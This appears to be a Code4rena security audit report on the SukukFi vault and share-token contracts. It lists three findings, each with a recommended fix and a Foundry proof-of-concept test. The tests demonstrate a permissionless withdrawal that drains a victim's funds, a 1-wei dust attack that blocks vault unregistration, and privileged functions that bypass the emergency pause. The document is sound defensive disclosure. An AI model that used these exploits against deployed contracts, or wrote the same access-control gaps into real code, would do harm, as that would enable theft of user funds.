# [SukukFi Report](https://code4rena.com/reports/2025-11-sukukfi)

| ID | Title |
|:--:|:---|
| [H-1](#h-1-missing-caller-verification-in-_withdraw-allows-theft-of-assets) | Missing caller verification in `_withdraw` allows theft of assets |
| [M-1](#m-1-vault-unregistration-permanently-blocked-by-dust-griefing-or-sticky-users) | Vault unregistration permanently blocked by dust griefing or sticky users |
| [L-1](#l-1-missing-whennotpaused-modifier-allows-batch-transfers-and-rbalance-adjustments-to-bypass-emergency-pause) | Missing `whenNotPaused` modifier allows batch transfers and rBalance adjustments to bypass emergency pause |

# [H-1] Missing caller verification in `_withdraw` allows theft of assets
https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575Vault.sol#L397

## Finding description
The `_withdraw()` function handles the destruction of shares and transfer of underlying assets. This function contains a critical access control omission.
The line `_shareToken.spendSelfAllowance(owner, shares)` correctly verifies that the owner has the necessary withdrawal limit (i.e., `allowance[owner][owner]`) approved by the Validator. However, the function fails to verify the identity of the `msg.sender`. It neither requires `msg.sender == owner`, nor does it check if `msg.sender` has a valid ERC-20 allowance to spend the owner's shares.
```solidity
function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {
    // ... 
    _shareToken.spendSelfAllowance(owner, shares); // Only checks owner's self-allowance, ignores msg.sender permissions
    _shareToken.burn(owner, shares); // Burns owner's shares
    SafeTokenTransfers.safeTransfer(_asset, receiver, assets); // Sends assets to receiver (can be anyone)
```
This means that as long as an `owner` account has `Self-Allowance`, anyone can call the `withdraw()` or `redeem()`, specify themselves as the `receiver`, and transfer the `owner`'s funds.

## Impact
The existence of this vulnerability places any user who obtains withdrawal permission at immediate risk of theft.

Direct Fund Loss: Once a user obtains the Validator-approved Self-Allowance, any attacker can front-run the user's withdrawal transaction by monitoring the mempool and calling `withdraw()` first. The attacker does not need private keys or special privileges to burn the victim's shares and transfer the underlying assets to themselves.

## Recommended mitigation steps
Enforce caller verification in the `_withdraw()` function. If the caller is not the `owner`, the contract must check and consume the caller's standard ERC-20 allowance for the owner's assets.
```diff
    function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {
        // ... (existing checks)
+       if (msg.sender != owner) {
+           _shareToken.spendAllowance(owner, msg.sender, shares);
+       }

        _shareToken.spendSelfAllowance(owner, shares);
```

## POC
In the following PoC, the victim obtains a legitimate Validator approval, but an unrelated third-party hacker successfully calls withdraw to steal the funds.
- Copy the test contract below into the `test/` folder and run `forge test --mt test_AnyoneCanSteal -vv`
```solidity
import "../src/ERC20Faucet.sol";
import "../src/WERC7575ShareToken.sol";
import "../src/WERC7575Vault.sol";
import "forge-std/Test.sol";

contract CriticalTheftPoC is Test {
    WERC7575ShareToken shareToken;
    WERC7575Vault vault;
    ERC20Faucet usdt;

    address validator;
    uint256 validatorPk;
    address victim = makeAddr("victim");
    address hacker = makeAddr("hacker");

    bytes32 constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    function setUp() public {
        (validator, validatorPk) = makeAddrAndKey("validator");
        usdt = new ERC20Faucet("USDT", "USDT", 1_000_000 ether);
        shareToken = new WERC7575ShareToken("RWA Share", "rShare");
        vault = new WERC7575Vault(address(usdt), shareToken);

        shareToken.registerVault(address(usdt), address(vault));
        shareToken.setValidator(validator);
        shareToken.setKycAdmin(validator);

        vm.prank(validator);
        shareToken.setKycVerified(victim, true);

        // Victim deposits 1000 USDT
        usdt.transfer(victim, 1000 ether);
        vm.startPrank(victim);
        usdt.approve(address(vault), 1000 ether);
        vault.deposit(1000 ether, victim);
        vm.stopPrank();
    }

    function test_AnyoneCanSteal() public {
        uint256 amount = 1000 ether;

        // === Step 1: Victim receives Validator approval (simulating a normal withdrawal process) ===
        // Construct the Validator's Permit signature for the Victim
        uint256 deadline = block.timestamp + 1 hours;
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, keccak256(abi.encodePacked(
            "\x19\x01", shareToken.DOMAIN_SEPARATOR(),
            keccak256(abi.encode(PERMIT_TYPEHASH, victim, victim, amount, shareToken.nonces(victim), deadline))
        )));
        
        // Victim submits Permit and obtains Self-Allowance
        vm.prank(victim);
        shareToken.permit(victim, victim, amount, deadline, v, r, s);
        console.log("Before Attack Victim Share Balance: ", shareToken.balanceOf(victim));
        console.log("Before Attack Hacker USDT Balance:  ", usdt.balanceOf(hacker));

        // === Step 2: Hacker launches a permissionless attack ===
        // Hacker detects that Victim has allowance and frontruns by calling withdraw directly
        vm.startPrank(hacker); 
        vault.withdraw(amount, hacker, victim);
        vm.stopPrank();

        // === Verification ===
        console.log("After Attack Victim Share Balance: ", shareToken.balanceOf(victim));
        console.log("After Attack Hacker USDT Balance:  ", usdt.balanceOf(hacker));
        assertEq(shareToken.balanceOf(victim), 0, "Victim drained");
        assertEq(usdt.balanceOf(hacker), amount, "Hacker got funds");
    }
}
```

# [M-1] Vault unregistration permanently blocked by dust griefing or sticky users
https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575ShareToken.sol#L256
https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/ShareTokenUpgradeable.sol#L282

## Finding description
In `ShareTokenUpgradeable.sol` and `WERC7575ShareToken.sol`, the `unregisterVault()` function uses strict pre-checks: the vault must have an exact zero asset balance and zero active requests.

However, the protocol does not provide any administrative tools (such as rescueFunds or forceUnregister) to handle cases where these conditions cannot be met. This allows certain scenarios—either malicious or natural—to permanently block vault removal:

1. Malicious Griefing: An attacker can transfer 1 wei of the underlying asset directly to the vault. Since ERC20 transfers are permissionless, anyone can do this at almost no cost.
2. Rounding Dust: Small leftover amounts may remain in the vault because of precision differences in share-to-asset conversions, even after all users have withdrawn.
3. Inactive Users: If a user loses their key or does not withdraw a small residual balance, the admin becomes unable to unregister the vault for upgrades or risk mitigation.

## Impact
1. Operational blockage: The admin cannot remove deprecated, broken, or compromised vaults.
2. Resource exhaustion: The protocol enforces a maximum of 10 vaults per share token (`MAX_VAULTS_PER_SHARE_TOKEN`). A vault that cannot be unregistered blocks future upgrades or expansions.

## Recommended mitigation steps
- Add a cleanup/rescue function: Add a `rescueFunds(token, amount)` function in the vault contract (restricted to `onlyOwner`) to remove dust balances.
- Allow forced unregistration: Add a `forceUnregisterVault()` function that bypasses checks and is used only in emergencies.

## POC
The PoC demonstrates one of several ways to prevent unregistration: the attacker transfers 1 wei into the vault, causing the admin’s unregistration attempt to revert.
Copy the test contract below into the `test/` folder and run `forge test --mt test_PreventUnregisterWith1Wei -vv`
```solidity
import "../src/ERC20Faucet.sol";
import "../src/WERC7575ShareToken.sol";
import "../src/WERC7575Vault.sol";
import "../src/interfaces/IERC7575Errors.sol";
import "forge-std/Test.sol";

contract UnregisterVaultDoSTest is Test {
    WERC7575ShareToken public shareToken;
    WERC7575Vault public vault;
    ERC20Faucet public token;

    address public owner;
    address public attacker;

    function setUp() public {
        owner = address(this);
        attacker = makeAddr("attacker");

        token = new ERC20Faucet("USDT", "USDT", 100000 * 1e18);
        shareToken = new WERC7575ShareToken("wUSDT", "wUSDT");
        vault = new WERC7575Vault(address(token), shareToken);

        shareToken.registerVault(address(token), address(vault));
        token.transfer(attacker, 10 * 1e18); // Give the attacker a small amount of funds
    }

    function test_PreventUnregisterWith1Wei() public {
        // Vault is empty at first with no user funds; admin intends to unregister it
        require(token.balanceOf(address(vault)) == 0, "Vault should be empty initially");
 
        // Attacker sends 1 wei to the vault as a dust attack
        vm.startPrank(attacker);
        token.transfer(address(vault), 1);
        vm.stopPrank();
        console.log("Vault Balance:", token.balanceOf(address(vault)));

        // Verify DoS
        vm.startPrank(owner);
        // Expected revert: CannotUnregisterVaultAssetBalance
        // This is a griefing attack — a very cheap way to block system maintenance
        vm.expectRevert(IERC7575Errors.CannotUnregisterVaultAssetBalance.selector);
        shareToken.unregisterVault(address(token));       
        vm.stopPrank();
    }
}
```

# [L-1] Missing `whenNotPaused` modifier allows batch transfers and rBalance adjustments to bypass emergency pause
https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575ShareToken.sol#L700
https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575ShareToken.sol#L1119
https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575ShareToken.sol#L1435
https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575ShareToken.sol#L1485

## Finding description
In the `WERC7575ShareToken.sol` contract, the NatSpec comment on the `pause()` function clearly states that it is meant to stop batch transfers and rBalance adjustments in emergency situations:
```solidity
/**
* @dev Pause critical ShareToken operations. Only callable by owner.
* Used for emergency situations to halt batch transfers and rBalance adjustments.
*/
function pause() external onlyOwner {
```
However, the `batchTransfers()` (and `rBatchTransfers()`) functions and the `adjustrBalance()`(and `cancelrBalanceAdjustment()`) functions do not include the `whenNotPaused` modifier:
```solidity
function batchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts) external onlyValidator returns (bool) {

function rBatchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts, uint256 rBalanceFlags) external onlyValidator returns (bool) {

function adjustrBalance(address account, uint256 ts, uint256 amounti, uint256 amountr) external onlyRevenueAdmin {

function cancelrBalanceAdjustment(address account, uint256 ts) external onlyRevenueAdmin {
```

## Impact

This issue does not directly cause loss of funds, but it breaks the intended safety design. In an emergency—such as a key compromise or system failure, the pause mechanism cannot stop fund-related operations.

## Recommended mitigation steps
Add the `whenNotPaused` modifier to all core privileged functions to match the intended behavior described in the comments.
```diff
- function batchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts) external onlyValidator returns (bool) {
+ function batchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts) external onlyValidator whenNotPaused returns (bool) {

- function rBatchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts, uint256 rBalanceFlags) external onlyValidator returns (bool) {
+ function rBatchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts, uint256 rBalanceFlags) external onlyValidator whenNotPaused returns (bool) {

- function adjustrBalance(address account, uint256 ts, uint256 amounti, uint256 amountr) external onlyRevenueAdmin {
+ function adjustrBalance(address account, uint256 ts, uint256 amounti, uint256 amountr) external onlyRevenueAdmin whenNotPaused {

- function cancelrBalanceAdjustment(address account, uint256 ts) external onlyRevenueAdmin {
+ function cancelrBalanceAdjustment(address account, uint256 ts) external onlyRevenueAdmin whenNotPaused {
```

## POC
The PoC demonstrates that even when the contract is paused, the `batchTransfer()` and `adjustrBalance()` functions can still be invoked.
- Copy the test contract below into the `test/` folder and run `forge test --mt test_Pause_Bypass`
```solidity
import "../src/ERC20Faucet.sol";
import "../src/WERC7575ShareToken.sol";
import "../src/WERC7575Vault.sol";
import "forge-std/Test.sol";

contract PauseBypassTest is Test {
    WERC7575ShareToken public shareToken;
    WERC7575Vault public vault;
    ERC20Faucet public token;

    address public owner;
    address public validator;
    address public revenueAdmin;
    address public user1;
    address public user2;

    function setUp() public {
        owner = address(this);
        validator = makeAddr("validator");
        revenueAdmin = makeAddr("revenueAdmin");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        token = new ERC20Faucet("USDT", "USDT", 100000 * 1e18);

        shareToken = new WERC7575ShareToken("wUSDT", "wUSDT");
        vault = new WERC7575Vault(address(token), shareToken);

        shareToken.registerVault(address(token), address(vault));
        shareToken.setValidator(validator);
        shareToken.setRevenueAdmin(revenueAdmin);
        shareToken.setKycAdmin(owner);

        shareToken.setKycVerified(user1, true);
        shareToken.setKycVerified(user2, true);

        token.transfer(user1, 1000 ether);
        
        vm.startPrank(user1);
        token.approve(address(vault), 1000 ether);
        vault.deposit(1000 ether, user1);
        vm.stopPrank();
    }

    function test_Pause_Bypass() public {
        // Pause the contract
        vm.prank(owner);
        shareToken.pause();
        assertTrue(shareToken.paused(), "System should be paused");

        // Verify that normal users cannot transfer
        vm.prank(user1);
        vm.expectRevert(Pausable.EnforcedPause.selector);
        shareToken.transfer(user2, 10 ether);

        // Verify that the Validator can bypass pause
        address[] memory debtors = new address[](1);
        address[] memory creditors = new address[](1);
        uint256[] memory amounts = new uint256[](1);

        debtors[0] = user1; 
        creditors[0] = user2; 
        amounts[0] = 500 ether;

        vm.prank(validator);
        shareToken.batchTransfers(debtors, creditors, amounts);

        // Check balances: User1 decreases, User2 increases
        assertEq(shareToken.balanceOf(user2), 500 ether, "Validator moved funds during pause");

        // Verify that RevenueAdmin can bypass pause  
        vm.prank(revenueAdmin);
        shareToken.adjustrBalance(user1, block.timestamp, 100 ether, 120 ether); // Simulate recording profit adjustment for user1
        assertEq(shareToken.rBalanceOf(user1), 20 ether, "RevenueAdmin adjusted rBalance during pause");
    }
}
```
